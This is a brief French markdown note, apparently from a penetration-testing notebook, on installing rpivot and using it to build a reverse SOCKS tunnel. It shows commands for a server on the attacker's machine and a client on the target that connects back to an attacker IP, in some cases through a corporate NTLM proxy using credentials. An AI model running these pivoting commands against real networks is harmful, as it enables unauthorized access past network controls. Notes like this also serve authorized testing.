---
public: true # set to true to make the article publishable
---
## Installation

```

sudo git clone https://github.com/klsecservices/rpivot.git
sudo apt-get install python2.7
```

## Fonctionnement

Cet outil s'appuie sur le protocole HTTP et peut même se connecter au proxy de l'entreprise en utilisant une authentification NTLM 

2 composants : 
- `server.py` à installer sur la machine de l'attaquant : il écoute localement sur 2 ports
	- 1 port sur lequel le `client.py` va se connecter
	- 1 port sur lequel il expose un service **socks4**
- `client.py` qui se connecte au `server.py` pour établir un tunnel HTTP.

### Lancement du serveur

```
# sur la machine de l'attaquant
python2.7 server.py --proxy-port 1080 --server-port 1234 --server-ip 0.0.0.0
```

### Lancement du client

```
# depuis la cible
# connexion simple
python2.7 client.py --server-ip 10.10.15.213 --server-port 1234

# connexion via le proxy de l'entreprise avec une authentification NTLM
python2.7 client.py --server-ip 10.10.15.213 --server-port 1234 --ntlm-proxy-ip <ProxyIP> --ntlm-proxy-port 3129 --domain DOMAIN --username user --password pass
```